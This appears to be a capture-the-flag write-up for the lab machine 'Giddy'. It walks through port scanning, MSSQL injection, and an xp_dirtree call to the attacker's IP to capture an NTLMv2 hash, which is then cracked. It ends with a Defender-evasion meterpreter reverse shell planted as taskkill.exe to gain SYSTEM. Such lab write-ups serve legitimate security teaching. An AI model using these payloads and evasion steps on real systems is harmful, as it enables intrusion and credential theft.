# Giddy

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.96.140 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 10:00 EDT
Nmap scan report for 10.129.96.140
Host is up (0.0083s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

Both RDP and WinRM are accessible on this machine, which is new.&#x20;

### SQLI --> Stacy Shell

Port 80 just shows a cute image:

<figure><img src="../../../.gitbook/assets/image (2466).png" alt=""><figcaption></figcaption></figure>

I ran a `gobuster` scan on this, and found 2 directories:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.129.96.140 -t 100 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.96.140
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/08 10:02:08 Starting gobuster in directory enumeration mode
===============================================================
/remote               (Status: 302) [Size: 157] [--> /Remote/default.aspx?ReturnUrl=%2fremote]
/mvc                  (Status: 301) [Size: 148] [--> http://10.129.96.140/mvc/]
```

Visiting it reveals a Windows Powershell Web Access page:

<figure><img src="../../../.gitbook/assets/image (1404).png" alt=""><figcaption></figcaption></figure>

The MVC site reveals some online store:

<figure><img src="../../../.gitbook/assets/image (852).png" alt=""><figcaption></figcaption></figure>

When products are viewed, it loads this URL:

```
http://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=18
```

If we replace the number with a `'` character, a lot of SQL errors are returned:

<figure><img src="../../../.gitbook/assets/image (4084).png" alt=""><figcaption></figcaption></figure>

This is vulnerable to SQL injection. Googling any of the errors here reveals that this is MSSQL, which we can actually get RCE from through `xp_cmdshell`.&#x20;

```sql
2; EXEC master ..xp_dirtree '\\10.10.14.13\share'; --
```

We can start `responder` and intercept the response by sending the above command:

<figure><img src="../../../.gitbook/assets/image (1016).png" alt=""><figcaption></figcaption></figure>

Then we can crack this hash easily using `john`:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash             
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xNnWo6272k7x     (Stacy)     
1g 0:00:00:00 DONE (2023-05-08 10:10) 1.020g/s 2744Kp/s 2744Kc/s 2744KC/s xabat..x6forever
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

By right, this machine came our before `evil-winrm`, so the intentional route is to use the Remote Powershell Web Access to download and execute a reverse shell. I did it the `evil-winrm` way.

<figure><img src="../../../.gitbook/assets/image (2683).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Unifivideo

Within the Documents directory, there's one folder present:

```
*Evil-WinRM* PS C:\Users\Stacy\documents> dir


    Directory: C:\Users\Stacy\documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2018   9:36 AM              6 unifivideo

*Evil-WinRM* PS C:\Users\Stacy\documents> type unifivideo
stop
```

Also, we can enumerate and see that Windows Defender is enabled for this machine, meaning any payload we use has to be obfuscated and encoded.&#x20;

```
*Evil-WinRM* PS C:\Users\Stacy\documents> cmd.exe /c "sc query windefend"

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

So we cannot run WinPEAS on this machine too. I decided to check if the Powershell history files were present still, because it could contain some good information, and it did exist:

```
*Evil-WinRM* PS C:\Users\Stacy> type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net stop unifivideoservice
$ExecutionContext.SessionState.LanguageMode
Stop-Service -Name Unifivideoservice -Force
Get-Service -Name Unifivideoservice
whoami
Get-Service -ServiceName UniFiVideoService
```

Now we can exploit this.&#x20;

{% embed url="https://www.exploit-db.com/exploits/43390" %}

We need to create a reverse shell file that would bypass Windows Defender. I was a bit lazy, so I used `msfconsole` to generate this:

```
use evasion/windows/windows_defender_exe
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 4444
run
[+] OFVDGEyW.exe stored at /home/kali/.msf4/local/OFVDGEyW.exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 4444
run
```

Afterwards, we just need to transfer this reverse shell over and name it as `taskkill.exe` within `C:\programdata\unifi-video` and then run the `stop-service -name Unifivideoservice` command.

<figure><img src="../../../.gitbook/assets/image (2542).png" alt=""><figcaption></figcaption></figure>

Then, we would get a meterpreter shell on the listener:

<figure><img src="../../../.gitbook/assets/image (850).png" alt=""><figcaption></figcaption></figure>

Rooted!
